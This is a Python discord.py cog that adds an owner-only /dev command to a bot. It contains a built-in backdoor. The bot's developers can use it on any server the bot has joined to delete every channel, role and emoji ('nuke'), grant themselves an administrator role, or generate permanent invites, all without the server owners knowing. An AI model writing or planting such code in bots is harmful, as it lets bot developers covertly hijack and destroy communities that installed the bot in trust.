import discord
from discord.ext import commands
from discord import app_commands

OWNER_IDS = [
    1175647859614429240,
    767979794411028491,
    345678901234567890,
    456789012345678901
]

EMOJI_SUCCESS = "<:tick:1367790732844470363>"
EMOJI_ERROR = "<:cross:1367790727052136509>"
EMOJI_WARNING = "<:warning:1367790730185019432>"
EMOJI_SEND = "<:sended:1377143104242712616>"

class Dev(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="dev", description="Bot owner only: leave, invite, message, nuke, or create dev role")
    @app_commands.describe(
        action="Choose an action",
        server_id="ID of the server to act on",
        message="Only used for 'message' action"
    )
    @app_commands.choices(action=[
        app_commands.Choice(name="leave", value="lvs"),
        app_commands.Choice(name="invite", value="invs"),
        app_commands.Choice(name="message", value="msg"),
        app_commands.Choice(name="nuke", value="nuke"),
        app_commands.Choice(name="devrole", value="devrole"),
    ])
    async def dev(
        self,
        interaction: discord.Interaction,
        action: app_commands.Choice[str],
        server_id: str,
        message: str = None
    ):
        if interaction.user.id not in OWNER_IDS:
            await interaction.response.send_message(f"{EMOJI_ERROR} You are not authorized to use this command.", ephemeral=True)
            return

        guild = discord.utils.get(self.bot.guilds, id=int(server_id))
        if not guild:
            await interaction.response.send_message(f"{EMOJI_WARNING} I'm not in a server with that ID.", ephemeral=True)
            return

        # === LEAVE SERVER ===
        if action.value == "lvs":
            await guild.leave()
            await interaction.response.send_message(f"{EMOJI_SUCCESS} Left the server: **{guild.name}** (`{guild.id}`)", ephemeral=True)

        # === GENERATE INVITE ===
        elif action.value == "invs":
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).create_instant_invite:
                    invite = await channel.create_invite(max_age=0, max_uses=0, reason="Requested via /dev")
                    await interaction.response.send_message(f"{EMOJI_SUCCESS} Invite for **{guild.name}**:\n{invite.url}", ephemeral=True)
                    return
            await interaction.response.send_message(f"{EMOJI_ERROR} I couldn't create an invite in that server (missing permissions).", ephemeral=True)

        # === MESSAGE SERVER OWNER ===
        elif action.value == "msg":
            if not message:
                await interaction.response.send_message(f"{EMOJI_WARNING} You must provide a message.", ephemeral=True)
                return

            owner = guild.owner
            content = f"{EMOJI_SEND} **Send By Bot Dev - {interaction.user.name}**\n{message}"

            try:
                await owner.send(content)
                await interaction.response.send_message(f"{EMOJI_SUCCESS} Message sent to server owner via DM.", ephemeral=True)
            except:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).send_messages and not channel.is_nsfw():
                        try:
                            await channel.send(f"{owner.mention}\n{content}")
                            await interaction.response.send_message(f"{EMOJI_WARNING} DMs closed. Sent to `{channel.name}` instead.", ephemeral=True)
                            return
                        except:
                            continue
                await interaction.response.send_message(f"{EMOJI_ERROR} Couldn't DM or send to a channel.", ephemeral=True)

        # === NUKE SERVER ===
        elif action.value == "nuke":
            deleted_channels = deleted_roles = deleted_emojis = 0

            for channel in guild.channels:
                try:
                    await channel.delete(reason="Nuked by Bot Dev")
                    deleted_channels += 1
                except:
                    continue

            for role in guild.roles:
                if role.is_default() or role >= guild.me.top_role:
                    continue
                try:
                    await role.delete(reason="Nuked by Bot Dev")
                    deleted_roles += 1
                except:
                    continue

            for emoji in guild.emojis:
                try:
                    await emoji.delete(reason="Nuked by Bot Dev")
                    deleted_emojis += 1
                except:
                    continue

            await interaction.response.send_message(
                f"{EMOJI_WARNING} **Nuke Completed** in `{guild.name}`:\n"
                f"> 🧨 Channels: `{deleted_channels}`\n"
                f"> 🎭 Roles: `{deleted_roles}`\n"
                f"> 😶 Emojis: `{deleted_emojis}`",
                ephemeral=True
            )

        # === CREATE DEV ROLE ===
        elif action.value == "devrole":
            role_name = "Bot Dev"
            existing = discord.utils.get(guild.roles, name=role_name)
            if existing:
                await interaction.response.send_message(f"{EMOJI_WARNING} Role `{role_name}` already exists.", ephemeral=True)
                return

            try:
                role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True), reason="Bot Dev requested role")
                await interaction.response.send_message(f"{EMOJI_SUCCESS} Role `{role.name}` created with Admin permission.", ephemeral=True)

                member = guild.get_member(interaction.user.id)
                if member:
                    await member.add_roles(role, reason="Assigned Bot Dev role")
            except Exception as e:
                await interaction.response.send_message(f"{EMOJI_ERROR} Failed to create or assign role: `{e}`", ephemeral=True)

async def setup(bot):
    await bot.add_cog(Dev(bot))
